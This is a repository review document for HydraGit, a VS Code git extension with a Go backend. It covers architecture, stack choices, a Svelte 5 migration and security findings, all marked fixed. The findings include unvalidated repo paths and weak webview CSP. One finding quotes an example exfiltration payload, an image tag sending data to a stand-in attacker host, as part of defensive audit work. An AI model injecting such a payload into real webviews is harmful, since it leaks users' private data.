# FABLE.md — Repo Review Findings

> Architecture / stack / security review of HydraGit, 2026-06-09.
> Reviewed: `internal/git/repo.go`, `internal/ipc/handler.go`, `cmd/hydragit/main.go`,
> `extension/src/{goProcess,panel,RepoService}.ts`, `internal/git/log.go`,
> `docs/SECURITY.md`, `go.mod`, `package.json`.

**TL;DR:** Architecture is genuinely good and structurally enforced. Stack choices are
defensible (one honest caveat about the Go layer). Two real security gaps exist that are
**not** in `SECURITY.md` — unvalidated `msg.repo` is the one to fix before the next
release — plus one reliability bug that borders on DoS (64KB stdin scanner limit).

---

## Architecture

### What works

- **The layering is enforced structurally, not by convention.** `runCore`
  (`internal/git/repo.go:63`) is verifiably the only exec point; `handler.go` is the only
  dispatch; the webview holds zero git logic. The entire git surface is auditable by
  reading two files.
- **Parsing is done right.** `\x1f` (ASCII unit separator) field delimiter with explicit
  `--format` strings (`internal/git/log.go:20`) — unambiguous, no guessing at human-readable
  output.
- **The `ui.prompt` / `ui.confirm` seam** in `panel.ts` (native dialogs over the same
  id-based message bus) is a clean pattern that keeps dialog UI in the host.
- **Sensible operational details:** 30s `networkTimeout` on remote ops with a meaningful
  error message on expiry; `--force-with-lease` instead of `--force`; auto-stash before
  hard reset; pending-promise rejection when the Go process dies (`goProcess.ts:63`).

### Issues

1. ✅ **FIXED 2026-06-09 — The Go IPC loop was fully serial.** Each request now runs in
   its own goroutine (`main.go`, `sync.WaitGroup.Go` + a stdout write mutex; the TS side
   matches responses by id, so out-of-order replies are fine). Per-repo `sync.RWMutex`
   in `ipc.Handle`: commands in the `mutatingCmds` set (index/worktree/local-ref writers)
   take the repo's exclusive lock; reads *and remote-only ops* (fetch/push/`*.remote`)
   share it — so a 30s-hung fetch no longer blocks the status poll, and distinct repos
   never block each other. A hung `pull` still blocks its own repo's panel (it mutates
   the worktree, exclusivity is correct there). Covered by
   `handler_concurrency_test.go` (race-detector-friendly; run with `go test -race`).

2. ✅ **FIXED 2026-06-09 — `lastStatusHash` single global.** Now a map keyed by repo
   path, guarded by a mutex (required anyway once requests went concurrent).

3. ✅ **FIXED 2026-06-09 — stray TS git exec points.** Both `fileExistsAtRef` and
   `openCommitUrl` are now bounded by a 5s timeout (`HOST_GIT_TIMEOUT_MS`). Logging
   deliberately omitted: both are local-only reads where failure is an expected answer
   ("file absent at ref" / "no remote configured"), not an error worth log noise.

---

## Stack

- **Zero runtime npm dependencies and zero production Go dependencies** (go.mod is all
  test tooling). Excellent supply-chain posture for a Marketplace extension — genuinely rare.
- **The Go binary is the debatable choice.** What it buys: a great test story (real
  temp-repo tests are far nicer in Go than Node), fast parsing of huge logs, a hard wall
  keeping git logic out of TS. What it costs: 4-platform binary distribution, the still-open
  macOS signing/notarization item, process lifecycle/crash handling, and the whole IPC
  layer — all wrapping the same git CLI that `child_process.execFile` could call from the
  host. The cost is already paid and the test suite is the payoff — don't unwind it, but
  resist letting the Go side grow features that don't need it.
- **Svelte: already on the v5 compiler, components still in v4 syntax.** `svelte@5.55.0`
  is installed and the toolchain builds with it; the 17 components are written in legacy
  syntax (`export let` in 17 files, `$:` in 15) running under Svelte 5's compatibility
  mode. The risky half of the migration (toolchain) is already done — what remains is a
  mechanical syntax modernization. See the migration plan below. (CLAUDE.md's "Svelte 4
  webview" line is stale.)
- Nit: `activationEvents` lists `"onStartupFinished"` twice in `package.json`.

---

## Svelte 5 migration plan

**✅ DONE 2026-06-09.** All 20 components migrated to runes via `svelte/compiler`
`migrate()` + a manual pass that eliminated every `svelte/legacy` crutch the codemod
left (8 files had `run()`/`createBubbler`/`stopPropagation`/`preventDefault` shims).
Notable manual decisions: BranchPane's open-state caches reverted to plain lets (the
codemod made them `$state`, creating a read+write self-retrigger risk inside the tree
effects, now `$effect.pre` to compute before paint); `App.repoName` became `$derived`;
`SideBySideDiff.diffCount` stayed an effect (it's a `$bindable` pushed to the parent);
dead `bubble()` forwarders removed (no parent listened). All 20 compile clean in runes
mode. Verification (user runs): `make webview-check`, `npm run test`, Playwright e2e.

Original plan, for reference:

**Status (verified 2026-06-09):** the compiler is already Svelte 5 (`5.55.0` installed,
Vite toolchain builds with it). All 17 `.svelte` components are written in legacy v4
syntax and run under Svelte 5's compatibility mode. Zero uses of
`createEventDispatcher` — the most painful deprecated pattern is absent. This is a
**syntax modernization, not a framework upgrade**; the risky toolchain half is done.

Scope of legacy syntax: `export let` props in 17 files, `$:` reactive statements in 15
files, `webview/src/panels/sidebar/shared/repoStore.ts` uses `writable` stores (still
fully supported in runes mode — optional to convert).

### Steps

1. **Codemod:** `npx sv migrate svelte-5` over `webview/src` — mechanically converts
   `export let` → `$props()`, most `$:` → `$derived`, `on:click` → `onclick`.
2. **Manual pass:** `$:` statements with side effects become `$effect(...)` (the codemod
   flags ambiguous ones rather than guessing); review each.
3. **Stores:** leave `repoStore.ts` as `writable` for now — valid in runes mode; convert
   to `$state`-based modules later only if it pays for itself.
4. **Verify (user runs):** `make webview-check` (svelte-check), `npm run test` (Vitest —
   the emit/prop component tests are the regression net), Playwright e2e.
5. **Docs:** update CLAUDE.md stack line ("Svelte 4 webview" → Svelte 5).

### Timing & risk

- **Do it after the first Marketplace release** — it produces a pixel-identical UI and
  shouldn't gate launch.
- Risk is low: small component count, compat mode allows converting one component at a
  time, and the Vitest suite covers exactly the surface that changes (props/emits).
- Showcase angle: "migrated the UI layer across a major framework rewrite with zero
  regressions, proven by my own test suite" — better LinkedIn material than the
  migration itself.

---

## Security

`docs/SECURITY.md` is honest and its threat-model scoping is correct. These findings are
ranked; **#1–#4 are not in SECURITY.md.**

### 1. ✅ FIXED 2026-06-10 — `msg.repo` unvalidated (arbitrary-path git execution)

`repoAllowed()` gate at the top of both `onDidReceiveMessage` handlers in `panel.ts`,
fed by `setKnownRepoRoots()` from `extension.ts` (refreshed *before* the webviews learn
the repo list, so the webview can never know a root the gate doesn't). Original finding:

`RepoService.setActive` validates against known repos, but the per-request stamp bypasses
it entirely: the webview sends `msg.repo`, `panel.ts:345` (and the sidebar handler at
`panel.ts:508`) forward it verbatim to `goProcess.send`, and `handler.go:80` overrides
`repoPath` with it. A compromised webview — or a plain bug — can run **any command against
any directory on disk**: `log`/`diff` to read a private repo elsewhere under `$HOME` and
render it, or `reset --hard` / `stash.clear` / `branch.delete -D` to destroy one.

This upgrades a webview XSS from "messes up my panel" to "reads/destroys anything
git-shaped on the machine."

*Fix:* in both `onDidReceiveMessage` handlers, reject `msg.repo` unless it is in
`RepoService.getRepos()`. This single check also substantially mitigates the still-open
command-allowlist item in SECURITY.md.

### 2. ✅ FIXED 2026-06-09 — `bufio.Scanner` 64KB token limit kills the IPC loop

`main.go` used a default `bufio.Scanner` on stdin — max token 64KB. Buffer-aware blame
sends the entire editor buffer in `params.contents`; blaming any file over ~64KB made the
scanner fail with "token too long", killing the backend.
Fixed alongside the concurrent-loop rework: `scanner.Buffer(make([]byte, 0, 64*1024), 16*1024*1024)`.

### 3. ✅ FIXED 2026-06-10 — `worktree.open` accepted an arbitrary path

Host now validates the path against `worktree.list` before `vscode.openFolder`.
Original finding:

`panel.ts:296` passes `msg.params.path` straight to `vscode.openFolder` with
`forceNewWindow`. Opening an attacker-chosen folder is a workspace-trust escalation vector
(that folder's `.vscode` config gets a foothold).

*Fix:* validate the path against the last `worktree.list` result before opening.

### 4. ✅ FIXED 2026-06-10 — `img-src https:` exfiltration channel

Verified no remote images are loaded anywhere (the only `<img>` is the bundled icon),
so `https:` was dropped outright and `connect-src 'none'` added — all three panels now
have zero network egress. Original finding:

With `default-src 'none'` blocking fetch, the blanket avatar allowance (`panel.ts:406`) is
the only network egress left in the main panel: an injected
`<img src="https://evil.tld/?d=branchnames">` exfiltrates via query string.

*Fix:* scope `img-src` to the actual avatar hosts (Gravatar/GitHub) instead of all of `https:`.

### 5. ✅ Previously-documented open items — all closed 2026-06-10

1. **Sidebar CSP** — done; same locked-down CSP as the main panel.
2. **`HYDRAGIT_REPO` validation at startup** — done via `git.IsRepo()` (routed through
   the single exec point). Deliberately warn-don't-exit: with multi-repo, requests carry
   their own repo override, so a bad default must not kill working repos.
3. **`force` confirmation gating** — done: `destructiveOpBlocked()` in `panel.ts` only
   forwards `force: true` params, `push.force` and `stash.clear` if a native `ui.confirm`
   was answered Yes within 30s. Known limitation (documented in SECURITY.md): the
   confirmation proves *a* recent native Yes, it isn't bound to the specific op.
4. **Empty-param rejection** — done: `missingParam()` guards every mutating command;
   stash pop/apply/drop reject negative indexes.
5. Bonus from the same pass: log dir/file permissions tightened to `0o700`/`0o600`.

**Still open (tracked in SECURITY.md):** full message shape validation and an explicit
host-side command allowlist; ref-name belt-and-suspenders validation. All are
defense-in-depth behind the repo gate + Go's `default:` case, not exposed holes.

---

## Immediate-fixes table — all landed

| # | Fix | Where | Status |
|---|---|---|---|
| 1 | Allowlist `msg.repo` against known repo roots | `panel.ts` both handlers | ✅ 2026-06-10 |
| 2 | Raise scanner buffer to 16MB | `main.go` | ✅ 2026-06-09 |
| 3 | Validate `worktree.open` path against `worktree.list` | `panel.ts` | ✅ 2026-06-10 |
| 4 | Add CSP meta to sidebar HTML | `panel.ts` `HydraSidebarProvider.getHtml()` | ✅ 2026-06-10 |
